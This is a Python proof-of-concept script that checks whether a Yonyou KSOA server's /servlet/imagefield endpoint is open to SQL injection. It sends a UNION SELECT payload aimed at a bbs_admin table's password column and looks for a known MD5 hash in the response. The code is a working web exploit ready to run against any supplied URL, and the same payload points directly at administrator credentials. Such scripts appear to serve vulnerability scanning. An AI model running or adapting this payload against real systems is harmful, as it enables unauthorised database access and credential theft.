import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友时空KSOA-imagefield接口存在SQL注入漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
    }
    vurl = urllib.parse.urljoin(url, "/servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1%27+union+select+sys.fn_varbintohexstr(hashbytes(%27md5%27,%271%27))--+")
    try:
        response = requests.get(vurl, headers=headers)
        if response.status_code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult